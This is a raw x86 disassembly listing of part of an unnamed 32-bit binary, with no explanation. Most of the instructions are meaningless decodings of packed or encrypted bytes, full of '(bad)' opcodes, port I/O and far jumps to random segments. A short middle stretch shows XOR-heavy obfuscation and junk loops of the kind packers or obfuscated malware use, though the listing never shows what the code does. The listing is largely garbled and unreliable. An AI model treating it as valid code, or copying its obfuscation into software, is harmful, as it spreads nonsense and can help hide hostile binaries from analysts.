  41ce17:	pop    ss
  41ce18:	fnsave [ecx+eax*2-0x313cacfd]
  41ce1f:	int3   
  41ce20:	loop   0x41ce27
  41ce22:	mov    edx,0xb31b83e5
  41ce27:	push   0x74
  41ce29:	cwde   
  41ce2a:	fisub  WORD PTR [ecx-0x578871cc]
  41ce30:	loope  0x41cdf4
  41ce32:	js     0x41ce9f
  41ce34:	aaa    
  41ce35:	lahf   
  41ce36:	sub    al,0xa2
  41ce38:	sbb    bl,cl
  41ce3a:	jg     0x41ce36
  41ce3c:	mov    bl,0x8c
  41ce3e:	mov    dh,0x56
  41ce40:	mov    ebp,0x444fd53b
  41ce45:	clc    
  41ce46:	stos   BYTE PTR es:[edi],al
  41ce47:	arpl   WORD PTR [esi],bp
  41ce49:	fistp  WORD PTR [ecx+0x1a4e3102]
  41ce4f:	fstp   TBYTE PTR [ebx-0x17]
  41ce52:	iret   
  41ce53:	or     BYTE PTR gs:[eax-0x80],bl
  41ce57:	mov    esp,DWORD PTR [esi-0x22]
  41ce5a:	jl     0x41ce93
  41ce5c:	dec    dx
  41ce5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce5f:	bound  ecx,QWORD PTR [esi]
  41ce61:	enter  0x8cca,0xab
  41ce65:	outs   dx,BYTE PTR ds:[esi]
  41ce66:	fiadd  DWORD PTR [ebx+ecx*1]
  41ce69:	push   esp
  41ce6a:	cwde   
  41ce6b:	add    DWORD PTR [esi],esi
  41ce6d:	daa    
  41ce6e:	test   BYTE PTR [edi],dl
  41ce70:	scas   eax,DWORD PTR es:[edi]
  41ce71:	xchg   edi,eax
  41ce72:	sub    DWORD PTR [ebx+edi*8+0x236b8199],0x2c3c1643
  41ce7d:	sbb    al,0xba
  41ce7f:	add    DWORD PTR [esi+0x267ea06],0x49
  41ce86:	sar    BYTE PTR [ecx+0x27637d84],0x4b
  41ce8d:	cmp    al,0x5f
  41ce8f:	call   0x4b02:0x1243aa1d
  41ce96:	and    esp,DWORD PTR [ecx-0x5d239a55]
  41ce9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce9d:	sub    esp,DWORD PTR [eax]
  41ce9f:	(bad)
  41cea2:	jmp    FWORD PTR [eax+0x7c]
  41cea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cea6:	aaa    
  41cea7:	mov    ah,0x49
  41cea9:	cs or  al,0x7d
  41ceac:	sbb    eax,0x80f6ffd0
  41ceb1:	bound  edi,QWORD PTR [esi+0x77]
  41ceb4:	rcl    BYTE PTR [ecx-0x233212cc],0x83
  41cebb:	jae    0x41cf1b
  41cebd:	pop    ebp
  41cebe:	test   ecx,edi
  41cec0:	gs ss pop edx
  41cec3:	or     DWORD PTR [edi],ecx
  41cec5:	or     cl,dl
  41cec7:	cdq    
  41cec8:	rcl    BYTE PTR [ecx-0x6c],1
  41cecb:	aas    
  41cecc:	nop
  41cecd:	cmp    eax,0x50fbafce
  41ced2:	push   cs
  41ced3:	adc    eax,0xe4ad5798
  41ced8:	or     BYTE PTR [edi-0x4d],0x30
  41cedc:	jecxz  0x41cf2f
  41cede:	mov    cl,0x57
  41cee0:	addr16 pop esp
  41cee2:	jnp    0x41ce8a
  41cee4:	lds    edi,FWORD PTR ss:[ebx]
  41cee7:	pop    ebp
  41cee8:	int    0x98
  41ceea:	(bad)  
  41ceeb:	sti    
  41ceec:	push   edi
  41ceed:	fisubr WORD PTR [esi-0x42]
  41cef0:	dec    ecx
  41cef1:	retf   0x2828
  41cef4:	mov    ds:0x5e843194,al
  41cef9:	xchg   edi,eax
  41cefa:	pop    edi
  41cefb:	loope  0x41ce8c
  41cefd:	sbb    esp,DWORD PTR [edx+0x71c26a4a]
  41cf03:	retf   0x34ca
  41cf06:	dec    edx
  41cf07:	and    dh,cl
  41cf09:	test   al,0x38
  41cf0b:	push   edi
  41cf0c:	xchg   edx,eax
  41cf0d:	jmp    0x41cf8d
  41cf0f:	das    
  41cf10:	pop    edi
  41cf11:	and    edx,0xffffffcd
  41cf14:	loop   0x41cf4a
  41cf16:	inc    esp
  41cf17:	xchg   ecx,eax
  41cf18:	idiv   edx
  41cf1a:	inc    esi
  41cf1b:	pop    ss
  41cf1c:	shr    BYTE PTR [edi+0x38],1
  41cf1f:	ret    
  41cf20:	test   ecx,0x98bf5a59
  41cf26:	mov    WORD PTR [ecx-0x63],es
  41cf29:	std    
  41cf2a:	(bad)
  41cf2d:	add    esi,ebx
  41cf2f:	in     eax,dx
  41cf30:	push   eax
  41cf31:	mov    eax,ds:0x8ea31018
  41cf36:	push   ebx
  41cf37:	mov    BYTE PTR [ebx+0x73],bl
  41cf3a:	mov    ecx,0x23ee08f0
  41cf3f:	sbb    DWORD PTR [edi-0x6047da0e],edx
  41cf45:	fcmovnu st,st(3)
  41cf47:	dec    edi
  41cf48:	xchg   esi,eax
  41cf49:	out    0x4b,eax
  41cf4b:	mov    esi,0x683edaae
  41cf50:	adc    DWORD PTR [ebp+0x1639da12],esi
  41cf56:	mov    bh,0xb9
  41cf58:	add    edx,DWORD PTR [edx-0x6a]
  41cf5b:	out    0xf2,al
  41cf5d:	icebp  
  41cf5e:	mov    bl,0xcd
  41cf60:	and    eax,0x2b3e0ad1
  41cf65:	jo     0x41cfda
  41cf67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf68:	pop    ebp
  41cf69:	call   0x6c6c66f9
  41cf6e:	add    BYTE PTR [edx-0x1b53114f],bh
  41cf74:	shl    DWORD PTR [esi+0x7533a496],1
  41cf7a:	shl    BYTE PTR [bp+0x3082],1
  41cf7f:	xor    BYTE PTR [edx+0x79],0xb
  41cf83:	mov    eax,ds:0xa3dc7248
  41cf88:	xor    DWORD PTR [ebx+0x47],edi
  41cf8b:	push   eax
  41cf8c:	ja     0x41cf99
  41cf8e:	call   0x1053:0xe4b14787
  41cf95:	pop    ds
  41cf96:	out    0x6,eax
  41cf98:	stos   DWORD PTR es:[edi],eax
  41cf99:	and    al,0x99
  41cf9b:	inc    esp
  41cf9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf9d:	js     0x41cf3a
  41cf9f:	or     eax,edi
  41cfa1:	and    dl,bl
  41cfa3:	cmp    al,0x2d
  41cfa5:	sbb    ecx,DWORD PTR [ebx]
  41cfa7:	rcl    DWORD PTR [ebp+0x2e],cl
  41cfaa:	cs push ebp
  41cfac:	sub    esi,esp
  41cfae:	ret    0x3648
  41cfb1:	push   es
  41cfb2:	xor    BYTE PTR [esi],dh
  41cfb4:	cwde   
  41cfb5:	dec    eax
  41cfb6:	push   esp
  41cfb7:	adc    eax,ebp
  41cfb9:	lods   eax,DWORD PTR ds:[esi]
  41cfba:	fs inc ecx
  41cfbc:	inc    ecx
  41cfbd:	fistp  WORD PTR [eax-0x46]
  41cfc0:	jmp    0x41cf7e
  41cfc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfc3:	fadd   st(5),st
  41cfc5:	push   ds
  41cfc6:	fst    QWORD PTR [ecx]
  41cfc8:	std    
  41cfc9:	lods   al,BYTE PTR ds:[esi]
  41cfca:	mov    ds:0xe469319c,eax
  41cfcf:	sbb    al,0x67
  41cfd1:	xchg   dh,bh
  41cfd3:	pushf  
  41cfd4:	sub    BYTE PTR [edx-0x3f31ce9d],ch
  41cfda:	(bad)
  41cfdd:	call   0xf7b030cb
  41cfe2:	hlt    
  41cfe3:	adc    DWORD PTR [esi],0x784a2d31
  41cfe9:	mov    dh,0xab
  41cfeb:	sub    DWORD PTR [esi+0x28fee088],ebx
  41cff1:	jg     0x41d05d
  41cff3:	or     BYTE PTR [eax+0x41],bl
  41cff6:	xchg   ecx,eax
  41cff7:	mov    ds:0xd3493cd0,al
  41cffc:	mov    WORD PTR [esi+0x65],gs
  41cfff:	fisttp QWORD PTR [edi-0x11]
  41d002:	faddp  st(5),st
  41d004:	pop    ss
  41d005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d006:	leave  
  41d007:	sbb    BYTE PTR [ebx],bh
  41d009:	cmp    DWORD PTR [ebp+0x74],eax
  41d00c:	imul   edx,DWORD PTR [edx+0x53],0x69
  41d010:	in     eax,0x66
  41d012:	dec    esi
  41d013:	and    ebp,DWORD PTR [ecx]
  41d015:	add    BYTE PTR [edi-0x68],ch
  41d018:	xlat   BYTE PTR ds:[ebx]
  41d019:	or     al,0xc7
  41d01b:	enter  0x7095,0xa4
  41d01f:	dec    edx
  41d020:	push   ds
  41d021:	inc    ecx
  41d022:	(bad)  
  41d023:	pusha  
  41d024:	pusha  
  41d025:	les    ecx,FWORD PTR [ebx-0x49]
  41d028:	in     eax,0x1b
  41d02a:	push   ds
  41d02b:	(bad)  
  41d02c:	ror    DWORD PTR [esi-0x33],1
  41d02f:	mov    ebx,0x6c788bf5
  41d034:	push   ebp
  41d035:	fild   DWORD PTR [ebp-0x2e]
  41d038:	aaa    
  41d039:	inc    edx
  41d03a:	push   0xcb9bc2df
  41d03f:	or     DWORD PTR [esi-0x13],edi
  41d042:	outs   dx,DWORD PTR ds:[esi]
  41d043:	fimul  WORD PTR [ecx+0x7]
  41d046:	aam    0xa5
  41d048:	gs xchg edx,eax
  41d04a:	adc    eax,0xc8932b6e
  41d04f:	and    DWORD PTR [edx],eax
  41d051:	mov    bh,BYTE PTR [esi+0x5e]
  41d054:	push   cs
  41d055:	jno    0x41d045
  41d057:	xor    dl,BYTE PTR [eax]
  41d059:	scas   al,BYTE PTR es:[edi]
  41d05a:	sub    BYTE PTR [ebx+eax*4+0x37e08c86],0x93
  41d062:	pop    ebp
  41d063:	mov    ds:0xae93daec,eax
  41d068:	cld    
  41d069:	ins    DWORD PTR es:[edi],dx
  41d06a:	les    eax,FWORD PTR [ecx]
  41d06c:	inc    edx
  41d06d:	rcl    BYTE PTR [eax+0x46a0d243],0xcc
  41d074:	pop    edx
  41d075:	mov    edx,0x9faeb7d0
  41d07a:	ins    DWORD PTR es:[edi],dx
  41d07b:	mov    ecx,0x3047a772
  41d080:	dec    esi
  41d081:	loop   0x41d073
  41d083:	fld    st(2)
  41d085:	sub    BYTE PTR [ebx-0x57],0x2b
  41d089:	or     eax,0xa240388b
  41d08e:	out    0x63,eax
  41d090:	adc    BYTE PTR [ecx+0x69],dh
  41d093:	pop    ecx
  41d094:	(bad)  
  41d096:	(bad)  
  41d097:	add    edi,ebp
  41d099:	or     bh,al
  41d09b:	fisubr DWORD PTR [ebp+edx*1+0x6e662f32]
  41d0a2:	push   esi
  41d0a3:	and    dl,BYTE PTR [ecx-0x18]
  41d0a6:	pop    esp
  41d0a7:	mov    ecx,0x992e83a8
  41d0ac:	or     eax,0x31f9fad6
  41d0b1:	jns    0x41d0b5
  41d0b3:	inc    ebp
  41d0b4:	mov    al,ds:0x6351e5ec
  41d0b9:	addr16 in al,dx
  41d0bb:	dec    edi
  41d0bc:	scas   eax,DWORD PTR es:[edi]
  41d0bd:	push   edi
  41d0be:	pop    ss
  41d0bf:	lock (bad) 
  41d0c1:	cmp    ecx,ebx
  41d0c3:	fcomp  DWORD PTR [edx]
  41d0c5:	sub    esi,DWORD PTR [ebp+0x5f40ac01]
  41d0cb:	mov    bh,0x3c
  41d0cd:	dec    edx
  41d0ce:	add    bl,ah
  41d0d0:	rol    DWORD PTR [edi-0x5d],1
  41d0d3:	mov    cl,0x21
  41d0d5:	pop    es
  41d0d6:	xchg   edx,eax
  41d0d7:	sub    eax,0xca0f20d1
  41d0dc:	mov    ds:0x18c95c3,eax
  41d0e1:	sub    cl,0xc5
  41d0e4:	test   DWORD PTR [edx+0x4c664894],esi
  41d0ea:	fs jnp 0x41d0ea
  41d0ed:	add    BYTE PTR ds:[ebx+eiz*4+0x1b],ch
  41d0f2:	sbb    bl,dl
  41d0f4:	xchg   edx,eax
  41d0f5:	hlt    
  41d0f6:	or     ch,BYTE PTR [edx-0x24877c98]
  41d0fc:	in     eax,dx
  41d0fd:	jl     0x41d091
  41d0ff:	jns    0x41d0ae
  41d101:	dec    edx
  41d102:	jle    0x41d0c2
  41d104:	and    ebx,ebx
  41d106:	adc    BYTE PTR [esi-0x59a7d96b],0x91
  41d10d:	das    
  41d10e:	call   0x1c447374
  41d113:	push   ds
  41d114:	cli    
  41d115:	jmp    0x41d11b
  41d117:	add    eax,0xc44e8196
  41d11c:	xchg   ebp,eax
  41d11d:	leave  
  41d11e:	jecxz  0x41d15a
  41d120:	js     0x41d11c
  41d122:	mov    gs,ecx
  41d124:	gs inc ebx
  41d126:	or     BYTE PTR [edx+0x2d],ah
  41d129:	push   0xffffffa5
  41d12b:	dec    ecx
  41d12c:	mov    ch,0x1a
  41d12e:	dec    ebp
  41d12f:	hlt    
  41d130:	jp     0x41d0ed
  41d132:	sbb    ah,BYTE PTR [edx-0x44]
  41d135:	cwde   
  41d136:	jl     0x41d123
  41d138:	sbb    al,0xd5
  41d13a:	stos   DWORD PTR es:[edi],eax
  41d13b:	push   ss
  41d13c:	arpl   WORD PTR [edi+0x18],si
  41d13f:	icebp  
  41d140:	addr16 cmc 
  41d142:	pop    esp
  41d143:	xor    BYTE PTR [edx-0x66a7565f],0xa8
  41d14a:	adc    BYTE PTR [bp+si],0xd8
  41d14e:	xchg   ebx,eax
  41d14f:	xor    edi,eax
  41d151:	in     al,0x2d
  41d153:	mov    ah,0x8c
  41d155:	jl     0x41d1ba
  41d157:	push   eax
  41d158:	in     al,dx
  41d159:	xchg   ebp,eax
  41d15a:	push   ds
  41d15b:	(bad)  [ebx-0x75]
  41d15e:	leave  
  41d15f:	sub    ecx,DWORD PTR [ebx+0x4b331be9]
  41d165:	inc    esi
  41d166:	pop    ds
  41d167:	inc    edi
  41d168:	mov    dl,BYTE PTR [edi+0x63d47d6]
  41d16e:	sbb    BYTE PTR [ebp+0x62317b39],dh
  41d174:	in     al,dx
  41d175:	aas    
  41d176:	pop    edi
  41d177:	sysenter 
  41d179:	daa    
  41d17a:	jge    0x41d1ac
  41d17c:	sub    edi,DWORD PTR [esi]
  41d17e:	sub    edi,esi
  41d180:	jle    0x41d118
  41d182:	sti    
  41d183:	inc    edx
  41d184:	test   esp,ebp
  41d186:	mov    dl,0xc4
  41d188:	popf   
  41d189:	mov    edi,0x12019dd1
  41d18e:	jmp    0x872d9756
  41d193:	cs cs test edi,esi
  41d197:	neg    DWORD PTR [ebx]
  41d199:	xadd   BYTE PTR [esi],bl
  41d19c:	pop    edi
  41d19d:	les    edi,FWORD PTR [edx]
  41d19f:	cmp    al,al
  41d1a1:	cmp    eax,DWORD PTR ds:0x4af886c6
  41d1a7:	push   cs
  41d1a8:	mov    eax,0x47e453e9
  41d1ad:	scas   al,BYTE PTR es:[edi]
  41d1ae:	out    0x67,eax
  41d1b0:	mov    eax,0x90aa44bc
  41d1b5:	icebp  
  41d1b6:	test   BYTE PTR [edx-0x6f08f9ac],dl
  41d1bc:	or     dl,BYTE PTR [ebx+esi*2+0x1f]
  41d1c0:	cmp    eax,0xfc019981
  41d1c5:	fwait
  41d1c6:	push   0xffffff89
  41d1c8:	jmp    0x41d22c
  41d1ca:	sub    al,0xa0
  41d1cc:	dec    eax
  41d1cd:	in     eax,dx
  41d1ce:	jno    0x41d15c
  41d1d0:	repz mov al,ds:0x414d5a1b
  41d1d6:	shl    DWORD PTR [ebx+eax*4-0x71],0x1e
  41d1db:	sbb    al,0x4a
  41d1dd:	pop    ecx
  41d1de:	std    
  41d1df:	push   ebp
  41d1e0:	push   es
  41d1e1:	fcmove st,st(4)
  41d1e3:	retf   
  41d1e4:	fcom   DWORD PTR [edi-0x301695e0]
  41d1ea:	xchg   ebx,esp
  41d1ec:	mov    al,0x93
  41d1ee:	test   esi,0x3e6386ee
  41d1f4:	out    dx,al
  41d1f5:	push   0x1
  41d1f7:	jg     0x41d184
  41d1f9:	xchg   esp,eax
  41d1fa:	or     DWORD PTR es:[edx],edi
  41d1fd:	fs loope 0x41d20c
  41d200:	repz inc ecx
  41d202:	inc    eax
  41d203:	cmc    
  41d204:	or     ebp,esi
  41d206:	pop    esi
  41d207:	jmp    0x41d268
  41d209:	inc    ecx
  41d20a:	ss mov dl,bh
  41d20d:	dec    esi
  41d20e:	loopne 0x41d28c
  41d210:	jl     0x41d258
  41d212:	std    
  41d213:	cwde   
  41d214:	add    DWORD PTR [esi-0x27b1ea9e],0x26f1adfc
  41d21e:	test   ebp,0x89b576dd
  41d224:	fsubr  DWORD PTR [eax]
  41d226:	inc    ebp
  41d227:	pop    ds
  41d228:	mov    edi,0x2befe6ec
  41d22d:	dec    ebx
  41d22e:	cld    
  41d22f:	mov    eax,0xcbbe4bbb
  41d234:	lock mov bh,0x1c
  41d237:	mov    WORD PTR [ebp+0x18d261eb],gs
  41d23d:	xor    DWORD PTR gs:[esi-0x61aef0c],ebx
  41d244:	mov    eax,ds:0x5b303ff1
  41d249:	jmp    0x90dd:0xe9bfa2a5
  41d250:	sub    esp,edx
  41d252:	mov    dl,0x17
  41d254:	icebp  
  41d255:	cmp    eax,0xb59f2c75
  41d25a:	test   DWORD PTR [ebx],0xd96af342
  41d260:	stc    
  41d261:	fwait
  41d262:	add    DWORD PTR [esi-0x44d5daf8],edx
  41d268:	fisttp QWORD PTR [ebx-0x6192c90b]
  41d26e:	add    ecx,DWORD PTR [eax+0x5d30df04]
  41d274:	rcr    BYTE PTR [eax],0x89
  41d277:	xor    dl,BYTE PTR ds:0xfbe1d113
  41d27d:	adc    bl,al
  41d27f:	mov    edx,0xe507b90
  41d284:	adc    DWORD PTR [esi+0x2f],esp
  41d287:	ret    
  41d288:	es pop esp
  41d28a:	fild   DWORD PTR [ebx-0x1ee3543e]
  41d290:	jge    0x41d2d1
  41d292:	retf   
  41d293:	in     eax,dx
  41d294:	(bad)  
  41d295:	jmp    0x5349:0x199e4fad
  41d29c:	adc    BYTE PTR ds:0x1502899d,bl
  41d2a2:	mov    cl,0x9a
  41d2a4:	jne    0x41d238
  41d2a6:	mov    ah,BYTE PTR [edi+0x6cc29d8]
  41d2ac:	cld    
  41d2ad:	pop    edi
  41d2ae:	mov    edx,0x189c6600
  41d2b3:	push   ecx
  41d2b4:	fiadd  DWORD PTR [edi+0x7a]
  41d2b7:	retf   
  41d2b8:	in     eax,dx
  41d2b9:	call   0x411ab49d
  41d2be:	outs   dx,DWORD PTR ds:[esi]
  41d2bf:	xchg   edi,eax
  41d2c0:	xchg   edx,eax
  41d2c1:	jle    0x41d2bf
  41d2c3:	adc    DWORD PTR [edx],ebp
  41d2c5:	int3   
  41d2c6:	push   esi
  41d2c7:	push   0x9b778508
  41d2cc:	mov    ebx,0xbedff5de
  41d2d1:	arpl   WORD PTR [ebx-0x62],si
  41d2d4:	loop   0x41d351
  41d2d6:	loopne 0x41d2ff
  41d2d8:	stos   DWORD PTR es:[edi],eax
  41d2d9:	mov    WORD PTR [ebp+0x70],?
  41d2dc:	mov    eax,0x36d23a28
  41d2e1:	je     0x41d325
  41d2e3:	cdq    
  41d2e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2e5:	js     0x41d2e6
  41d2e7:	push   es
  41d2e8:	jg     0x41d284
  41d2ea:	and    al,0x42
  41d2ec:	loope  0x41d33c
  41d2ee:	fbstp  TBYTE PTR ds:0x829629ee
  41d2f4:	stos   DWORD PTR es:[edi],eax
  41d2f5:	bswap  edi
  41d2f7:	mov    ds:0x838ed744,al
  41d2fc:	mov    ch,BYTE PTR [ecx+0x3f0b83db]
  41d302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d303:	mov    BYTE PTR [ecx+0x1e],0x74
  41d307:	sub    esi,DWORD PTR cs:[esi-0x55]
  41d30b:	push   esi
  41d30c:	inc    edx
  41d30d:	(bad)  
  41d30e:	ja     0x41d2e4
  41d310:	ja     0x41d2a1
  41d312:	ss push es
  41d314:	lods   al,BYTE PTR ds:[esi]
  41d315:	imul   edx,DWORD PTR [eax+0x2a],0x2
  41d319:	js     0x41d359
  41d31b:	test   al,0x95
  41d31d:	pop    ebx
  41d31e:	jb     0x41d35c
  41d320:	nop
  41d321:	pop    edi
  41d322:	jno    0x41d2c6
  41d324:	fdivr  QWORD PTR [edx-0x54a04ff5]
  41d32a:	xchg   edx,eax
  41d32b:	pop    ss
  41d32c:	inc    ebx
  41d32d:	jg     0x41d391
  41d32f:	mov    eax,0xa20089e4
  41d334:	outs   dx,BYTE PTR ds:[esi]
  41d335:	or     eax,0x2b959d53
  41d33a:	push   edx
  41d33b:	test   DWORD PTR [edx+eax*2+0xac3a1ce],edx
  41d342:	and    ecx,DWORD PTR [edx+eax*4-0x68e9629f]
  41d349:	pop    esi
  41d34a:	jmp    DWORD PTR [ebx+0x2d217d33]
  41d350:	addr16 fcmovnu st,st(6)
  41d353:	shl    BYTE PTR [edx-0x7018c9fe],cl
  41d359:	arpl   WORD PTR [edx+0x63],sp
  41d35c:	out    0x4d,al
  41d35e:	pushf  
  41d35f:	int    0x89
  41d361:	arpl   ax,bx
  41d363:	mov    al,0x26
  41d365:	jns    0x41d369
  41d367:	add    al,0x27
  41d369:	pushf  
  41d36a:	and    al,BYTE PTR [ebx+0x7ead89f3]
  41d370:	pop    eax
  41d371:	pop    edi
  41d372:	(bad)  
  41d374:	xchg   edx,eax
  41d375:	bound  esi,QWORD PTR [eax-0x6]
  41d378:	adc    BYTE PTR [edi],al
  41d37a:	sti    
  41d37b:	ficom  WORD PTR [bx-0x36]
  41d37f:	pop    esi
  41d380:	sub    DWORD PTR [eax+0x6d5a2ebb],edx
  41d386:	jle    0x41d34c
  41d388:	mov    eax,DWORD PTR [ebx]
  41d38a:	xlat   BYTE PTR ds:[ebx]
  41d38b:	and    edx,ebx
  41d38d:	mov    DWORD PTR [ebp-0x4c],edx
  41d390:	xor    DWORD PTR ds:0x42a2d2,0x7dd7
  41d39a:	mov    edx,DWORD PTR [ebp+0x8]
  41d39d:	mov    ebx,DWORD PTR [ebp-0x48]
  41d3a0:	lea    edx,[ebx+edx*1+0x241fcdf]
  41d3a7:	mov    DWORD PTR [ebp-0x48],edx
  41d3aa:	mov    edx,DWORD PTR [ebp+0x8]
  41d3ad:	mov    ebx,0xfa5e1524
  41d3b2:	sub    ebx,edx
  41d3b4:	mov    DWORD PTR ds:0x42a27a,0x17
  41d3be:	cmp    DWORD PTR ds:0x42a27a,0x0
  41d3c5:	je     0x41d3ff
  41d3cb:	cmp    DWORD PTR ds:0x42a27a,0x25
  41d3d2:	jge    0x41d3ff
  41d3d8:	jmp    0x41d3ed
  41d3dd:	push   0x42a2be
  41d3e2:	push   0x429181
  41d3e7:	call   DWORD PTR ds:0x42a3ca
  41d3ed:	mov    edx,DWORD PTR ds:0x42a27a
  41d3f3:	dec    edx
  41d3f4:	mov    DWORD PTR ds:0x42a27a,edx
  41d3fa:	jmp    0x41d3be
  41d3ff:	add    ebx,DWORD PTR [ebp-0x44]
  41d402:	and    DWORD PTR ds:0x42a25a,ebx
  41d408:	mov    DWORD PTR [ebp-0x44],ebx
  41d40b:	mov    edx,DWORD PTR [ebp+0x8]
  41d40e:	sub    DWORD PTR ds:0x42a25e,0x69af
  41d418:	xor    edx,eax
  41d41a:	adc    DWORD PTR ds:0x42a2e6,0x774b
  41d424:	add    edx,esi
  41d426:	mov    DWORD PTR ds:0x42a2ae,0x6366
  41d430:	jne    0x418abe
  41d436:	jmp    0x421e4f
  41d43b:	adc    DWORD PTR ds:0x42a2d2,edx
  41d441:	mov    edx,DWORD PTR [ebp-0xc]
  41d444:	sub    DWORD PTR ds:0x42a2ae,0x4e6d
  41d44e:	sub    edx,esi
  41d450:	xor    edx,eax
  41d452:	sbb    DWORD PTR ds:0x42a2c6,0x8d4
  41d45c:	mov    DWORD PTR [ebp-0x5c],edx
  41d45f:	dec    DWORD PTR ds:0x42a2c2
  41d465:	mov    edx,DWORD PTR [ebp-0x10]
  41d468:	xor    DWORD PTR ds:0x42a2a2,0x42a286
  41d472:	mov    ebx,DWORD PTR [ebp-0x8]
  41d475:	and    DWORD PTR ds:0x42a2ca,0x42a292
  41d47f:	xor    edx,eax
  41d481:	xor    ebx,eax
  41d483:	add    DWORD PTR ds:0x42a29a,0x42a2c2
  41d48d:	sub    edx,ebx
  41d48f:	sub    edx,esi
  41d491:	xor    edx,eax
  41d493:	mov    DWORD PTR [ebp-0x10],edx
  41d496:	mov    edx,DWORD PTR [ebp-0x14]
  41d499:	mov    DWORD PTR [ebp+0x8],edx
  41d49c:	jmp    0x41f8db
  41d4a1:	sbb    edx,ebx
  41d4a3:	mov    edx,DWORD PTR [ebp+0x8]
  41d4a6:	sbb    ebx,DWORD PTR ds:0x42a25a
  41d4ac:	mov    ebx,DWORD PTR [ebp-0x8]
  41d4af:	xor    edx,eax
  41d4b1:	xor    ebx,eax
  41d4b3:	or     DWORD PTR ds:0x42a2f6,0x42a266
  41d4bd:	sub    edx,ebx
  41d4bf:	movzx  ebx,BYTE PTR ds:0x42a2a6
  41d4c6:	sbb    ebx,DWORD PTR ds:0x42a262
  41d4cc:	mov    DWORD PTR ds:0x42a2a6,ebx
  41d4d2:	sub    edx,esi
  41d4d4:	xor    edx,eax
  41d4d6:	mov    DWORD PTR [ebp+0x8],edx
  41d4d9:	mov    DWORD PTR ds:0x42a2b2,0x1f
  41d4e3:	cmp    DWORD PTR ds:0x42a2b2,0x0
  41d4ea:	je     0x41d526
  41d4f0:	cmp    DWORD PTR ds:0x42a2b2,0x21
  41d4f7:	jle    0x41d526
  41d4fd:	jmp    0x41d512
  41d502:	push   0x1ea3
  41d507:	push   0x42a29e
  41d50c:	call   DWORD PTR ds:0x42a3ce
  41d512:	xor    edx,edx
  41d514:	xor    edx,DWORD PTR ds:0x42a2b2
  41d51a:	dec    edx
  41d51b:	mov    DWORD PTR ds:0x42a2b2,edx
  41d521:	jmp    0x41d4e3
  41d526:	mov    edx,DWORD PTR [ebp+0x8]
  41d529:	mov    ebx,DWORD PTR [ebp-0x58]
  41d52c:	add    edx,0x5708fa
  41d532:	imul   edx,ebx
  41d535:	mov    DWORD PTR [ebp-0x58],edx
  41d538:	mov    edx,DWORD PTR [ebp+0x8]
  41d53b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d53e:	add    edx,0x64f898
  41d544:	or     edx,ebx
  41d546:	mov    DWORD PTR [ebp-0x54],edx
  41d549:	jmp    0x41f8a1
  41d54e:	in     al,0xd
  41d550:	in     al,0xc4
  41d552:	xchg   BYTE PTR [esi-0x72a2f23c],al
  41d558:	retf   0x1ce7
  41d55b:	icebp  
  41d55c:	fst    QWORD PTR [esi+0x4d]
  41d55f:	fstp   TBYTE PTR [ebx+eax*4+0x46]
  41d563:	pop    esi
  41d564:	add    DWORD PTR [ebx+0x695d940e],0x79
  41d56b:	fild   DWORD PTR [edx-0x5d]
  41d56e:	outs   dx,BYTE PTR ds:[esi]
  41d56f:	sti    
  41d570:	call   0xc06bdad0
  41d575:	xor    BYTE PTR [eax+0x5a],bl
  41d578:	push   eax
  41d579:	pop    eax
  41d57a:	sbb    DWORD PTR [ecx-0x7916204b],esp
  41d580:	pusha  
  41d581:	adc    BYTE PTR [ebx-0x7ea45406],0x82
  41d588:	mov    bh,0x5d
  41d58a:	mov    bl,0x9b
  41d58c:	sahf   
  41d58d:	dec    esp
  41d58e:	rcl    DWORD PTR [edi+ebx*2],cl
  41d591:	mov    ecx,0xf0345215
  41d596:	retf   
  41d597:	(bad)  
  41d598:	imul   edi,DWORD PTR [ebp+0x3d339b72],0xffffffe3
  41d59f:	jl     0x41d5f4
  41d5a1:	ud0    esp,DWORD PTR [ecx]
  41d5a4:	dec    ebp
  41d5a5:	ss ins DWORD PTR es:[edi],dx
  41d5a7:	lahf   
  41d5a8:	and    DWORD PTR [edi-0x21baff68],edx
  41d5ae:	popf   
  41d5af:	out    dx,al
  41d5b0:	adc    dl,BYTE PTR [ebx-0x14]
  41d5b3:	idiv   BYTE PTR [ebx+0x60]
  41d5b6:	addr16 mov eax,0x29aaf42c
  41d5bc:	gs ret 0x354b
  41d5c0:	mov    ss,WORD PTR [ebx+0x66]
  41d5c3:	popf   
  41d5c4:	(bad)  
  41d5c5:	mov    bh,0xea
  41d5c7:	sar    DWORD PTR [ebx],cl
  41d5c9:	pop    eax
  41d5ca:	(bad)  
  41d5cb:	out    0xdf,al
  41d5cd:	adc    eax,0x3edf3ed0
  41d5d2:	jne    0x41d60a
  41d5d4:	sbb    ah,BYTE PTR [ecx+ecx*2-0x76]
  41d5d8:	mov    dh,0xa2
  41d5da:	jns    0x41d5d0
  41d5dc:	and    ebx,esp
  41d5de:	inc    esi
  41d5df:	mov    eax,cs
  41d5e1:	jae    0x41d5d8
  41d5e3:	push   edx
  41d5e4:	dec    ebx
  41d5e5:	xor    al,0x2a
  41d5e7:	popf   
  41d5e8:	call   FWORD PTR [ebx-0x79]
  41d5eb:	fisttp WORD PTR [ebx-0x2b]
  41d5ee:	xchg   esi,eax
  41d5ef:	ret    
  41d5f0:	xor    bl,BYTE PTR ds:0x4981b12
  41d5f6:	stos   BYTE PTR es:[edi],al
  41d5f7:	pusha  
  41d5f8:	ins    DWORD PTR es:[edi],dx
  41d5f9:	jp     0x41d61d
  41d5fb:	shl    BYTE PTR [esi-0x30f7fac4],0x1
  41d602:	in     al,dx
  41d603:	adc    edi,DWORD PTR [ebx+0x2a4078e8]
  41d609:	test   al,0xd7
  41d60b:	js     0x41d598
  41d60d:	push   cs
  41d60e:	sub    ecx,edi
  41d610:	sub    al,0xa
  41d612:	inc    edx
  41d613:	rol    bh,cl
  41d615:	adc    eax,edx
  41d617:	aam    0x71
  41d619:	dec    bp
  41d61b:	lahf   
  41d61c:	sti    
  41d61d:	test   BYTE PTR [esp+edx*8],dl
